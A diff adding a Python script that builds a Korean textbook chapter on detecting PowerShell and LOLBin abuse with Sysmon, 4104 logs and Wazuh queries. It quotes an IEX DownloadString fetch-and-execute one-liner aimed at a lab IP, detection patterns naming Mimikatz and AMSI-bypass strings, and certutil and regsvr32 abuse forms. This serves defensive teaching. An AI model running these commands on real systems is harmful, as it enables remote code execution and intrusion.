@@ -1,0 +1,233 @@
+"""Module 01 실습 41·42·45·46을 2권 5장으로 구성한다."""
+from chapter_authoring import *
+pages=[]
+def page(title,*blocks,br=False):pages.append({'title':title,'kind':'body','level':'section','break':br,'blocks':list(blocks)})
+def screen(name,caption):return image(f'assets/screenshots/chapter05/{name}.png',caption)
+def fig(name,caption):return image(f'assets/figures/chapter05/{name}.png',caption)
+PSCHANNEL='data.win.system.channel:"Microsoft-Windows-PowerShell/Operational"'
+TOKEN='VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABiAG8AbwBrADIALQBjAGgAMAA1AC0AZQBuAGMAbwBkAGUAZAA='
+
+page('5장  PowerShell과 정상 프로그램 악용',
+ p('프로세스 이름이 정상이라고 실행 내용까지 정상인 것은 아니다. PowerShell은 시스템 관리에 쓰이지만 공격자의 명령도 실행할 수 있다. certutil처럼 운영체제에 포함된 도구도 파일 변환이나 다운로드에 이용된다. 이 장에서는 실행 파일, 인자, 부모 프로세스, 처리한 내용을 연결하여 동작을 판정한다.'),
+ p('명령줄은 프로그램에 전달한 입력이다. 그 안에 인코딩된 내용이나 다른 파일의 경로가 있으면 명령줄만 읽어 실제 동작을 모두 알기 어렵다. Sysmon 이벤트 1과 PowerShell 4104를 연결하고, 생성한 파일과 응답을 확인하여 실행 시도와 결과를 구분한다.'),
+ table(['실습','대상','완료 기준'],[['41 PowerShell','인코딩 · 다운로드 실행 구조','문자열 복원과 실제 응답 구분'],['42 스크립트 블록','4104 · 처리한 코드','분할 기록과 실행 문맥 확인'],['45 정상 도구 악용','certutil 등 실행 인자','변환·저장·실행을 따로 판정'],['46 문서 실행 징후','부모·자식 프로세스','모의 프로그램과 실제 Office 구분']],[31,42,54]),
+ image('assets/illustrations/chapter05-command.png','그림 5-1  인코딩된 입력을 다루는 실습 장면',65))
+
+page('5.1  실행 파일과 명령 내용을 구분하기',
+ p('Sysmon 이벤트 1에는 실행 파일 경로 image와 전체 명령줄 commandLine이 기록된다. parentImage는 부모 실행 파일이고 parentCommandLine은 부모가 시작할 때 받은 명령줄이다. 파일 이름만 보지 말고 전체 경로와 인자를 함께 읽는다.'),
+ fig('evidence','그림 5-2  입력과 처리 내용 및 실제 결과의 연결'),
+ p('PowerShell의 -EncodedCommand는 명령을 Base64 문자열로 받아 실행한다. Base64는 바이트를 문자로 표현하는 인코딩이며 암호화가 아니다. 복호화 키 없이 원문 바이트를 얻을 수 있다. 공격자는 표현을 복잡하게 만드는 데 이용하지만 정상 자동화도 같은 옵션을 쓸 수 있다.'),
+ p('PowerShell 스크립트 블록 로깅은 처리한 코드의 내용을 4104로 남긴다. 기록된 코드에 특정 함수 이름이 있다고 해서 함수 호출이나 공격 성공이 모두 입증되는 것은 아니다. 조건문, 문자열 상수, 실패한 처리, 출력 결과를 같이 확인한다.'))
+
+page('실습 위치와 센서 확인',
+ p('Windows 게스트의 관리자 Windows PowerShell 창을 연다. 이 장의 powershell.exe는 Windows PowerShell 5.1이다. PowerShell 7의 pwsh.exe와 로그 채널을 혼동하지 않는다. kt66의 준비 스크립트가 Sysmon과 PowerShell 채널 수집을 설정한다.'),
+ cmd('C05-01','hostname\nwhoami.exe\n$PSVersionTable.PSVersion\nGet-Service WazuhSvc,Sysmon64 |\n Format-Table Name,Status',
+ '컴퓨터와 계정을 먼저 확인한다. $PSVersionTable은 현재 PowerShell의 버전 정보이고 점(.) 뒤 PSVersion은 해당 속성을 선택한다. 서비스 목록은 파이프(|)로 Format-Table에 전달한다.',
+ 'KT66-WIN-01, 실습 계정, Windows PowerShell 5.1과 두 센서의 Running을 확인한다.'),
+ cmd('C05-02',"Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'\nGet-WinEvent -ListLog 'Microsoft-Windows-PowerShell/Operational' |\n Format-List LogName,IsEnabled\nGet-ExecutionPolicy -List",
+ 'Get-ItemProperty는 지정한 레지스트리 키의 값을 읽는다. Get-WinEvent -ListLog는 이벤트 자체가 아니라 채널 설정을 조회한다. Get-ExecutionPolicy -List는 적용 범위별 스크립트 실행 정책을 보여 준다.',
+ 'EnableScriptBlockLogging 1과 채널 IsEnabled True를 확인한다. 이번 게스트에서는 정책 범위가 모두 Undefined였고 .ps1 파일 실행은 제한됐다. 아래 실습은 직접 입력하는 명령을 사용한다.'))
+
+page('작업 폴더와 관찰 시각',
+ cmd('C05-03',"$dir = 'C:\\Windows\\Temp\\book2_ch05'\nTest-Path -LiteralPath $dir\n$start = Get-Date\n$start.ToUniversalTime().ToString('o')",
+ '$dir에 이번 장 전용 폴더를 지정한다. -LiteralPath는 경로를 문자 그대로 읽는다. $start는 이후 이벤트 조회의 시작 시각이다. 날짜 객체를 UTC 문자열로 표시해 다른 로그와 비교한다.',
+ '폴더는 False여야 한다. 이미 있으면 내용을 확인하고 다른 고유 이름을 정한다. 기존 폴더를 비우고 시작하지 않는다.'),
+ cmd('C05-04','New-Item -ItemType Directory -Path $dir\nGet-Item -LiteralPath $dir',
+ 'New-Item은 항목을 만드는 명령이다. -ItemType Directory는 폴더를 지정하며 -Path는 새 경로다. 생성 뒤 Get-Item으로 실제 항목의 위치를 확인한다.',
+ '전용 폴더의 경로를 확인한다. 이후 생성 파일과 삭제 대상은 이 폴더 안으로 한정한다.'),
+ p('Wazuh Discover를 열고 Last 24 hours에서 시작한다. 각 검색식에 적힌 데이터 보기를 선택한다. 결과에서 data.win.system.channel과 eventID, eventRecordID를 함께 읽는다. 검색 결과 수는 실습 반복과 조사 명령 때문에 달라질 수 있으므로 특정 객체와 프로세스를 식별한다.'))
+
+page('5.2  인코딩한 PowerShell 명령 실행',
+ cmd('C05-05',"$text = 'Write-Output book2-ch05-encoded'\n$bytes = [Text.Encoding]::Unicode.GetBytes($text)\n$encoded = [Convert]::ToBase64String($bytes)\n$encoded",
+ 'Write-Output은 값을 출력 스트림으로 내보내는 PowerShell 명령이다. 대괄호는 .NET 형식을 지정하고 이중 콜론(::)은 정적 멤버를 사용한다. Unicode.GetBytes는 이 명령을 UTF-16LE 바이트로, ToBase64String은 바이트를 Base64 문자로 바꾼다. 마지막 줄은 변수 내용을 표시한다.',
+ 'VwByAGkA로 시작하는 문자열을 얻는다. 입력 문구·공백·문자 인코딩이 달라지면 결과도 달라진다. 이 문자열은 명령의 표현이며 실행 결과가 아니다.'),
+ cmd('C05-06','powershell.exe -NoProfile -EncodedCommand $encoded',
+ 'powershell.exe는 새 Windows PowerShell 프로세스를 시작한다. -NoProfile은 사용자 프로필 스크립트를 읽지 않고, -EncodedCommand는 UTF-16LE 명령을 Base64로 받은 뒤 처리한다. 현재 창의 변수 값을 새 프로세스에 인자로 전달한다.',
+ 'book2-ch05-encoded가 출력되어야 한다. 인코딩 문자열이 손상되면 오류가 발생하므로 입력·공백·UTF-16LE 변환부터 확인한다.'))
+
+page('명령줄을 실행하지 않고 복원하기',
+ cmd('C05-07','[Text.Encoding]::Unicode.GetString(\n [Convert]::FromBase64String($encoded)\n)',
+ 'FromBase64String은 문자에서 바이트를 복원하고 Unicode.GetString은 UTF-16LE 바이트를 문자열로 읽는다. 괄호 안의 식을 먼저 계산한다. 이 명령은 복원한 문장을 출력하며 그 문장을 다시 실행하지 않는다.',
+ 'Write-Output book2-ch05-encoded가 나타나야 한다. 조사 중 발견한 문자열도 복원 결과를 먼저 읽는다. Invoke-Expression이나 호출 연산자로 알 수 없는 원문을 바로 실행하지 않는다.'),
+ fig('encoding','그림 5-3  Base64 인코딩과 문자열 복원'),
+ p('원전의 짧은 옵션 -nop·-enc는 각각 -NoProfile·-EncodedCommand에 대응한다. -w hidden은 -WindowStyle Hidden으로 새 창 표시 방식을 바꾸며, 로그 수집을 숨기는 옵션은 아니다. -ExecutionPolicy Bypass 역시 AMSI나 보안 제품을 비활성화하는 옵션과 다르다. 이번 입력에서는 창 숨김과 정책 변경을 사용하지 않는다.'))
+
+page('원본 Sysmon 프로세스 확인',
+ cmd('C05-08',"Get-WinEvent -FilterHashtable @{\n LogName='Microsoft-Windows-Sysmon/Operational'\n Id=1;StartTime=$start\n} | Format-List TimeCreated,Id,RecordId,Message",
+ 'Get-WinEvent의 조건 묶음 @{ }에서 채널·이벤트 ID·시작 시각을 지정한다. 세미콜론(;)은 조건 항목을 구분한다. 긴 Message는 Format-List로 읽는다. 이번 Base64 문자열이 포함된 자식 PowerShell을 찾는다.',
+ '이번 자식 프로세스의 RecordId는 8952였다. commandLine의 Base64, processGuid, 부모 경로와 user를 함께 기록한다.'),
+ query('Q05-01',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.image:*powershell.exe\nAND data.win.eventdata.commandLine:*'+TOKEN+'*',
+ 'wazuh-alerts-*에서 이번 문자열이 포함된 프로세스를 찾는다. 자신의 문구를 바꿨다면 C05-05의 출력 문자열로 조건을 바꾼다. 별표(*)는 전체 명령줄 중 해당 문자열이 들어간 위치를 허용한다.',
+ '이번에는 규칙 92057이 일치했다. 인코딩 옵션은 실행 형태에 대한 단서이며 출력한 문구 자체는 유해 동작이 아니다.','wazuh-alerts-*'),
+ screen('encoded-fields','화면 5-1  인코딩된 PowerShell 프로세스의 명령줄'))
+
+page('명령줄을 조사할 때의 판정 기준',
+ p('image가 실제 PowerShell 설치 경로인지 확인하고 commandLine의 실행 내용과 parentImage를 함께 읽는다. 같은 powershell.exe가 부모인 것은 콘솔에서 새 PowerShell을 시작한 이번 절차와 맞는다. 부모가 Office나 스크립트 엔진이면 실행 문서·스크립트와 전달 경로를 더 조사한다.'),
+ p('관리 자동화와 원격 관리 도구도 -EncodedCommand를 쓴다. 문자열을 복원해 실제 파일·네트워크·자격증명 접근이 있는지 읽고 승인된 작업과 비교한다. 규칙 레벨이나 MITRE 분류는 조사 우선순위의 참고이며 실행 결과를 대신하지 않는다.'),
+ query('Q05-02',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.image:*powershell.exe\nAND data.win.eventdata.commandLine:(*-enc* OR *-EncodedCommand* OR *DownloadString* OR *DownloadFile* OR *IEX* OR *Invoke-Expression*)',
+ '실습 문자열을 제거한 탐색용 검색식이다. OR는 여러 표현 중 하나를 찾고 괄호는 표현 묶음을 정한다. field의 실제 대소문자와 저장 방식을 확인한다. 이 목록이 모든 축약·난독화 표현을 포괄하는 것은 아니다.',
+ '입력 실행뿐 아니라 저자용 원격 관리나 조사 명령도 함께 잡힐 수 있다. 이름이 아닌 원문·부모·계정·시각으로 각 프로세스를 분류한다.'),
+ p('실행 여부를 추가 확인할 때는 파일 생성, 후속 프로세스, 네트워크 요청과 응답을 연결한다. PowerShell 프로세스 생성만으로 명령 내부의 모든 작업이 성공했다고 기록하지 않는다.'))
+
+page('5.3  다운로드와 실행을 구분하기',
+ p('원전은 웹에서 받은 문장을 곧바로 실행하는 형태도 제시한다. New-Object Net.WebClient는 웹 요청을 보낼 객체를 만들고 DownloadString은 응답을 문자열로 읽는다. IEX는 Invoke-Expression의 별칭이며 문자열을 PowerShell 코드로 해석해 실행한다. 네트워크 수신과 코드 실행은 서로 다른 단계다.'),
+ code("IEX (New-Object Net.WebClient).DownloadString(\n 'http://10.20.32.80/kt66-lab.ps1'\n)"),
+ p('이 입력은 원전의 명령 구조를 읽기 위한 예다. 원전 응답은 HTTP 404 Not Found였다. 서버가 요청 파일을 제공하지 못했으므로 그 결과에서 다운로드한 스크립트의 실행 성공을 확인할 수 없다. Sysmon에 IEX·DownloadString이 남는 것과 원격 코드가 전달되어 실행되는 것은 구분한다.'),
+ fig('download','그림 5-4  다운로드 요청과 응답 및 코드 처리의 판정 단계'),
+ p('조사할 때는 URL·응답 코드·응답 본문을 확보하고 같은 프로세스의 연결 기록과 서버 접근 로그를 대조한다. 200 응답도 정상 스크립트라는 보장은 없으며, 프록시 안내나 로그인 페이지가 반환될 수 있다. 확보한 문자열은 분석용 사본으로 읽고 출처가 불명확한 코드를 실행하지 않는다.'),
+ p('파일로 명시적으로 저장하지 않고 처리하더라도 명령줄·스크립트 블록·보안 제품·캐시 등 다른 흔적이 남을 수 있다. 파일리스라는 표현을 디스크 흔적이나 탐지 가능성이 전혀 없다는 뜻으로 사용하지 않는다.'))
+
+page('5.4  4104에서 처리한 코드 읽기',
+ p('스크립트 블록은 PowerShell이 처리하는 코드 단위다. 인코딩 문자열을 풀어 처리할 때에도 코드 내용이 4104에 나타날 수 있다. 이번에는 VirtualAlloc이라는 API 이름을 문자열로 출력하여 검색 단서와 실제 호출을 구분한다.'),
+ cmd('C05-09',"powershell.exe -NoProfile -Command {\n $api = 'VirtualAlloc'\n Write-Output ('book2-ch05-scriptblock ' + $api)\n}",
+ '현재 PowerShell에서 -Command 뒤 중괄호({ })는 새 PowerShell에 전달할 스크립트 블록이다. $api에는 문자열을 넣고 더하기(+)로 출력 문구와 연결한다. VirtualAlloc 함수를 호출하거나 메모리를 할당하는 입력이 아니다.',
+ 'book2-ch05-scriptblock VirtualAlloc이 출력된다. 부모 셸이 큰따옴표 안의 $api를 먼저 확장하여 구문이 깨지는 문제를 피하고 실행 정책을 바꾸지 않는다.'),
+ cmd('C05-10',"Get-WinEvent -FilterHashtable @{\n LogName='Microsoft-Windows-PowerShell/Operational'\n Id=4104;StartTime=$start\n} | Format-List TimeCreated,Id,RecordId,Message",
+ '4104가 기록되는 PowerShell 채널을 지정한다. Sysmon 채널의 이벤트 ID 1과 별개다. Message에서 book2-ch05-scriptblock과 VirtualAlloc을 찾고 ScriptBlock ID를 기록한다.',
+ '이번 자식의 처리 내용은 RecordId 2530, ScriptBlockId 5b40f8dd-b7da-4b25-932a-8b50a8b9a59e였다. 조사 명령이 같은 문자열을 포함한 별도 기록과 구분한다.'))
+
+page('스크립트 블록을 Wazuh에서 대조',
+ query('Q05-03',BASE+'\nAND '+PSCHANNEL+'\nAND data.win.system.eventID:"4104"\nAND data.win.eventdata.scriptBlockId:"5b40f8dd-b7da-4b25-932a-8b50a8b9a59e"',
+ '원본에서 읽은 ScriptBlockId로 한 코드 단위를 찾는다. 예제 GUID는 자신의 기록 값으로 바꾼다. data.win.system.processID도 원본 XML의 Execution ProcessID와 대조한다.',
+ '이번 이벤트는 아카이브에서 확인됐고 scriptBlockText에 문자열 대입과 출력 코드가 나타났다. 경보 문서가 없다는 이유로 레벨 0 규칙이 적용됐다고 추정하지 않는다.'),
+ screen('scriptblock-fields','화면 5-2  스크립트 블록의 식별자와 처리 내용'),
+ p('messageNumber와 messageTotal은 분할된 기록의 순서와 전체 수다. 긴 코드는 같은 ScriptBlockId의 여러 이벤트로 나뉠 수 있다. 한 조각만 읽지 말고 같은 컴퓨터와 시각 범위에서 번호 순으로 모아 누락 여부를 확인한다.'),
+ p('scriptBlockId와 Sysmon processGuid는 같은 종류의 식별자가 아니다. 같은 컴퓨터에서 4104의 processID와 해당 시각에 생성된 Sysmon 프로세스의 processId를 대조하고, 이후 Sysmon 사이에서는 processGuid로 연결한다. PID는 재사용될 수 있으므로 시간 조건이 필요하다.'))
+
+page('난독화 해제와 의심 문자열의 한계',
+ query('Q05-04',BASE+'\nAND '+PSCHANNEL+'\nAND data.win.system.eventID:"4104"\nAND data.win.eventdata.scriptBlockText:(*Invoke-Mimikatz* OR *Invoke-Shellcode* OR *System.Reflection.Assembly* OR *VirtualAlloc* OR *SetThreadContext* OR *AmsiUtils* OR *amsiInitFailed*)',
+ '원전의 의심 문자열을 탐색하는 검색식이다. 여러 문자열 중 하나가 들어간 처리 내용을 찾는다. 검색 결과는 실행한 함수 목록이 아니라 그 문자열을 포함한 코드 기록이다.',
+ '이번 VirtualAlloc 문구 출력도 조건에 맞는다. 주석·문자열·교육 예제·탐지 스크립트 자체가 포함될 수 있으므로 코드의 호출과 인자, 결과를 읽는다.'),
+ p('AMSI는 스크립트 등 내용을 보안 제품에 검사 요청할 수 있게 하는 인터페이스다. AmsiUtils·amsiInitFailed가 있으면 우회 관련 코드를 조사할 단서가 되지만, 문자열 존재만으로 우회 성공을 증명하지 않는다. 실제 호출·변경·오류·보호 제품의 결과를 확인한다.'),
+ p('VirtualAlloc은 메모리 할당, SetThreadContext는 스레드 문맥과 관련된 API다. 정상 소프트웨어도 사용할 수 있다. 인젝션 판단에는 대상 프로세스, 접근 권한, 메모리 쓰기와 실행 흐름 등 추가 증거가 필요하다. 이번 입력은 함수 이름을 출력했을 뿐이다.'),
+ p('4104는 처리한 코드의 중요한 근거지만 모든 문자열의 최종 값과 모든 실행 결과를 완전하게 기록하는 만능 추적기는 아니다. 로깅 설정, 분할·보관·수집 상태를 확인하고 원본 응답과 다른 이벤트로 보완한다.'))
+
+page('인코딩한 문구와 4104 연결',
+ query('Q05-05',BASE+'\nAND '+PSCHANNEL+'\nAND data.win.system.eventID:"4104"\nAND data.win.eventdata.scriptBlockId:"c6b05be4-bfdb-4ae4-b16c-ebcbd0c7d19b"',
+ 'C05-06에서 출력한 인코딩 문구의 원본 4104를 찾는다. 예제 GUID는 자신의 코드 기록에서 읽은 값으로 교체한다. 원본 번호는 이번에 2473이었다.',
+ 'scriptBlockText는 Write-Output book2-ch05-encoded였다. 명령줄의 Base64 복원 결과와 같은지 비교한다.'),
+ p('공격자가 다운로드한 코드와 사용자가 직접 실행한 코드는 같은 cmdlet을 사용할 수 있다. 코드 내용 외에 유입 경로·실행 계정·부모 프로세스를 확인한다. 신뢰할 수 있는 배포인지 확인될 때까지 출처와 의도를 별도 조사 항목으로 유지한다.'),
+ p('경보를 늘리기 위해 보호 기능을 해제하거나 난독화 기법을 반복할 필요는 없다. 수집이 안 보이면 Windows 원본, 채널 수집 설정, 관리자 archives 로그, Filebeat 색인 설정, Discover의 데이터 보기와 시간 범위를 순서대로 확인한다.'))
+
+page('5.5  정상 프로그램을 이용한 파일 처리',
+ p('Living Off the Land는 시스템에 이미 있는 기능이나 프로그램을 공격에 이용하는 방식을 가리킨다. LOLBin이라는 표현은 이때 이용되는 바이너리를 뜻한다. 파일이 정상 제품이고 서명되어 있어도 호출한 주체와 인자가 위험할 수 있다.'),
+ table(['프로그램','조사할 동작과 인자'],[['certutil','-decode로 파일 복원 · -urlcache로 URL 캐시 처리'],['mshta','로컬 또는 URL의 HTA 실행 · 스크립트 인자'],['regsvr32','DLL 등록 · /i: 인자와 scrobj.dll 조합'],['rundll32','지정 DLL과 진입점 · 비정상 경로·스크립트 표현'],['bitsadmin · wmic · msiexec','전송·프로세스 생성·설치 요청과 목적지']],[37,90]),
+ p('이름만으로 차단하면 정상 관리 기능에도 영향을 준다. 실행 경로·해시·서명, 사용자와 부모, 인자·대상 URL, 생성 파일과 후속 실행을 함께 확인한다. 이 실습에서는 certutil로 짧은 문구 파일을 복원한다. 다른 도구는 탐색 결과의 해석 대상으로 구분한다.'))
+
+page('certutil 입력 파일 준비',
+ p('certutil.exe는 인증서와 관련 정보를 다루는 Windows 관리 도구다. -decode 기능은 Base64로 표현된 파일을 원래 바이트로 되돌린다. 이번에는 실행 파일이나 배치 파일이 아닌 문구 파일을 만든다.'),
+ cmd('C05-11',"Test-Path -LiteralPath \"$dir\\p.b64\"\nTest-Path -LiteralPath \"$dir\\p.txt\"\n$plain = [Text.Encoding]::ASCII.GetBytes('book2-ch05-file')\n[Convert]::ToBase64String($plain) |\n Set-Content -LiteralPath \"$dir\\p.b64\" -Encoding ASCII\nGet-Content -LiteralPath \"$dir\\p.b64\"",
+ '두 출력 경로의 부재를 확인한 뒤 새 파일을 쓴다. ASCII.GetBytes는 영문 실습 문구를 바이트로 바꾼다. 파이프는 Base64 문자열을 Set-Content에 전달하며 -Encoding ASCII로 파일에 저장한다. 큰따옴표 안에서는 $dir 값이 실제 경로로 확장된다.',
+ '두 Test-Path는 False여야 한다. 기존 파일이 있으면 쓰기를 멈춘다. 새 p.b64의 내용은 Ym9vazItY2gwNS1maWxl이다.'),
+ p('UTF-16LE를 쓴 PowerShell 명령 인코딩과 이번 ASCII 문구 파일을 구분한다. Base64 자체가 원문 문자 인코딩을 알려 주지는 않는다. 원래 바이트의 의미와 사용하는 프로그램의 요구 형식을 확인해야 한다.'))
+
+page('문구 파일 복원과 확인',
+ cmd('C05-12','certutil.exe -decode "$dir\\p.b64" "$dir\\p.txt"\nGet-Content -LiteralPath "$dir\\p.txt"\nGet-FileHash -LiteralPath "$dir\\p.txt" -Algorithm SHA256',
+ '-decode 뒤의 첫 경로는 입력 파일, 둘째는 출력 파일이다. -f를 생략하여 기존 출력의 강제 덮어쓰기를 하지 않는다. Get-Content로 내용을 읽고 Get-FileHash -Algorithm SHA256으로 파일 지문을 계산한다.',
+ '복원 성공 뒤 book2-ch05-file이 읽힌다. 파일은 데이터이며 실행하지 않는다. 해시는 같은 파일인지 비교할 기준이지 안전성 판정 값이 아니다.'),
+ query('Q05-06',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.image:*certutil.exe\nAND data.win.eventdata.commandLine:*decode*\nAND data.win.eventdata.commandLine:*book2_ch05*',
+ 'certutil 프로세스와 이번 폴더의 decode 명령을 함께 찾는다. 파일이 실제로 생겼는지는 프로세스 생성 이벤트와 별도로 C05-12의 출력 파일로 확인한다.',
+ '이번 원본 번호는 8957이며 규칙 92073의 경보도 생성됐다. 원전과 달리 경보에 나타나도 동일 원본과 명령을 대조한다.'),
+ screen('certutil-fields','화면 5-3  certutil 실행 파일과 무결성 수준'),
+ p('image는 실제 실행 파일 경로다. integrityLevel의 High는 프로세스의 보안 무결성 수준이며, 파일의 해시 일치나 안전성을 판정한 결과가 아니다.'),
+ p('p.txt가 없으면 명령의 종료 응답, 입력 파일·형식, 경로 접근 권한, 보안 제품의 조치 순서로 확인한다. 파일 생성 성공을 명령 실행 성공이나 악성코드 활성화로 확장하지 않는다.'))
+
+page('다운로드와 보안 제품의 결과 연결',
+ p('원전은 certutil -urlcache -split -f URL 출력파일 형태도 제시한다. -urlcache는 URL 캐시 작업, -f는 해당 명령에서 강제 처리에 쓰이며 -split은 파일을 분리하는 옵션이다. 옵션 의미와 출력은 사용한 동작·버전에 맞추어 확인한다. 다운로드 대상으로 신뢰할 수 없는 실행 파일을 받아 실행하는 절차로 사용하지 않는다.'),
+ p('원전의 certutil 출력과 Defender 탐지는 당시의 관찰 결과다. 동일한 명령이 모든 버전에서 같은 위협명으로 차단된다고 보장할 수 없다. 차단되었을 때에도 이미 생성된 프로세스의 Sysmon 기록이 남을 수 있다. 1116 탐지가 Sysmon 1을 반드시 대체한다고 해석하지 않는다.'),
+ query('Q05-07',BASE+'\nAND data.win.system.channel:"Microsoft-Windows-Windows Defender/Operational"\nAND data.win.system.eventID:(1116 OR 1117)',
+ '실습 입력 시각을 포함하는 범위에서 Defender의 탐지와 조치를 별도로 확인한다. 1116은 탐지, 1117은 조치 기록으로 읽고 대상·조치 결과를 원본 메시지와 대조한다.',
+ '이번 문구 복원에 대응하는 차단을 전제로 하지 않는다. 검색된 다른 과거 탐지를 이번 파일에 연결하지 않는다.'),
+ p('regsvr32의 /s는 메시지를 조용히 처리하고 /u는 등록 해제, /i:는 설치 함수에 인자를 전달하는 형태다. scrobj.dll 및 URL이 함께 있으면 스크립틀릿 처리 문맥을 조사한다. rundll32는 DLL과 진입점의 실제 동작을, mshta는 HTA 내용과 후속 프로세스를 확인한다. 이 이름들이 있다는 이유만으로 백신 회피 성공을 기록하지 않는다.'))
+
+page('5.6  Office 이름을 가진 부모 프로세스',
+ p('피싱 문서의 매크로는 셸이나 스크립트 엔진을 자식으로 실행할 수 있다. 원전은 Office가 없는 게스트에서 WINWORD.EXE라는 이름의 작은 프로그램을 만들어 cmd.exe를 시작했다. 이름 기반 조건의 동작을 관찰한 것이며 실제 Word 문서나 매크로를 실행한 결과는 아니다.'),
+ fig('parent','그림 5-5  모의 부모 프로그램과 실제 자식 프로세스'),
+ p('같은 이름이라도 파일의 위치·서명·제품 정보가 다르면 다른 프로그램이다. 정상 Office도 추가 기능이나 승인된 자동화로 외부 프로그램을 실행할 수 있다. 부모·자식 관계는 조사 출발점이며 피싱 유입과 악성 매크로의 충분조건이 아니다.'),
+ cmd('C05-13',"$csc = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe'\nTest-Path -LiteralPath $csc\nTest-Path -LiteralPath \"$dir\\w.cs\"\nTest-Path -LiteralPath \"$dir\\WINWORD.EXE\"",
+ 'csc.exe는 C# 소스를 실행 파일로 만드는 .NET Framework 컴파일러다. 이번 Windows 게스트에서 준비된 전체 경로를 사용한다. PATH에 등록되어 있다고 가정하지 않는다.',
+ '컴파일러는 True, 두 새 파일 경로는 False여야 한다. 컴파일러가 없으면 준비 환경부터 확인하고 모의 실행을 성공한 것으로 기록하지 않는다.'))
+
+page('문구만 출력하는 부모 프로그램 작성',
+ p('아래 소스는 cmd.exe에 고정 문구 출력을 요청하고 종료를 기다린다. 외부 주소나 사용자 입력을 받지 않는다. System.Diagnostics는 프로세스 실행 기능을 제공한다. ProcessStartInfo는 자식 실행 파일과 인자를 담고, UseShellExecute=false는 운영체제 셸의 파일 연결 대신 지정한 프로그램을 실행하도록 한다.'),
+ cmd('C05-14',"@'\nusing System.Diagnostics;\nclass LabParent {\n  static void Main() {\n    var p = new ProcessStartInfo();\n    p.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\n    p.Arguments = \"/d /c echo book2-ch05-child\";\n    p.UseShellExecute = false;\n    using (var child = Process.Start(p)) {\n      child.WaitForExit();\n    }\n  }\n}\n'@ | Set-Content -LiteralPath \"$dir\\w.cs\" -Encoding ASCII",
+ 'PowerShell의 @\'와 \'@는 여러 줄 문자열의 시작과 끝이다. 종료 표시는 별도 줄 맨 앞에 둔다. 파이프 뒤 Set-Content가 C# 소스를 파일로 쓴다. C# 안의 @"경로"는 역슬래시를 그대로 보관하는 문자열이고, 중괄호는 코드 범위다.',
+ 'w.cs 파일이 생성된다. 사용한 이름 WINWORD.EXE는 다음 컴파일에서 붙일 모의 파일명이며 Microsoft Word를 설치하거나 대체하지 않는다.'),
+ p('cmd의 /d는 AutoRun 명령 처리를 생략하고 /c는 뒤의 명령을 실행한 뒤 종료한다. echo는 고정 문구를 출력한다. WaitForExit()는 자식 종료를 기다리며 using 블록은 사용한 프로세스 객체의 자원을 정리한다.'))
+
+page('소스 확인과 컴파일',
+ cmd('C05-15','Get-Content -LiteralPath "$dir\\w.cs"\n& $csc /nologo "/out:$dir\\WINWORD.EXE" "$dir\\w.cs"\n$LASTEXITCODE\nGet-Item -LiteralPath "$dir\\WINWORD.EXE"',
+ '작성한 소스를 읽고 고정된 cmd.exe와 문구를 확인한 뒤 컴파일한다. &는 변수 경로의 프로그램 호출, /nologo는 시작 안내 생략, /out:는 출력 실행 파일 경로다. $LASTEXITCODE는 직전에 실행한 외부 프로그램의 종료 코드다.',
+ '종료 코드 0과 출력 파일을 확인한다. 오류가 있으면 C05-14의 따옴표·중괄호·세미콜론과 경로를 점검한다. 기존 Microsoft Office 경로에 덮어쓰지 않는다.'),
+ cmd('C05-16','Get-AuthenticodeSignature -LiteralPath "$dir\\WINWORD.EXE" |\n Format-List Status,Path\n& "$dir\\WINWORD.EXE"',
+ 'Get-AuthenticodeSignature는 파일의 Authenticode 서명 상태를 조회한다. 모의 파일의 경로를 확인하고 그 파일만 실행한다.',
+ '이번 파일은 NotSigned이며 book2-ch05-child를 출력했다. 이 결과는 고정 문구를 실행한 모의 프로그램의 결과다. Office 라이선스·문서·매크로 상태와 관련된 결과가 아니다.'))
+
+page('부모와 자식을 Wazuh에서 찾기',
+ query('Q05-08',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.parentImage:*WINWORD.EXE\nAND data.win.eventdata.image:*cmd.exe\nAND data.win.eventdata.commandLine:*book2-ch05-child',
+ '부모 이름, 자식 실행 파일, 이번 문구를 모두 만족하는 이벤트를 찾는다. parentImage는 자식 이벤트에 들어 있는 부모 경로다. 부모 자체의 생성 이벤트와 같은 행으로 혼동하지 않는다.',
+ '이번 자식은 원본 번호 8962, 규칙 92052로 기록됐다. 부모는 Windows\\Temp\\book2_ch05 아래의 모의 파일이다.'),
+ screen('child-fields','화면 5-4  자식 이벤트에 기록된 부모 파일과 프로세스 식별자'),
+ p('자식의 parentProcessGuid를 부모 생성 이벤트의 processGuid에 연결한다. 이번 부모 원본 번호는 8961이며 식별자는 {af6e9a1f-7709-6ae9-6a06-000000000300}이었다. 두 GUID는 같은 부모를 지칭하지만 필드가 놓인 이벤트의 역할이 다르다.'))
+
+page('프로세스 관계와 문서 유입 경로 조사',
+ query('Q05-09',BASE+'\nAND '+SYSMON+'\nAND data.win.system.eventID:"1"\nAND data.win.eventdata.processGuid:"{af6e9a1f-7709-6ae9-6a06-000000000300}"',
+ '자식에서 읽은 parentProcessGuid를 조건 값으로 사용한다. 여기서는 부모 자신의 processGuid 필드로 찾는다. 컴퓨터와 시각을 한정하고 자신의 GUID로 바꾼다.',
+ '부모 경로와 commandLine, 다시 그 부모인 PowerShell을 확인한다. 일반 Word 설치 경로의 서명된 파일이라고 가정하지 않는다.'),
+ p('실제 사건에서는 부모 파일의 서명·제품 정보·해시와 설치 경로를 확인한 뒤 문서의 유입 경로를 조사한다. 메일 첨부, 브라우저 다운로드, 문서 메타데이터, 보안 제품 기록을 서로 연결한다. parentCommandLine에 문서 경로가 항상 포함되는 것은 아니다. 이미 실행 중인 Office가 문서를 열었거나 다른 실행 경로를 사용했을 수도 있다.'),
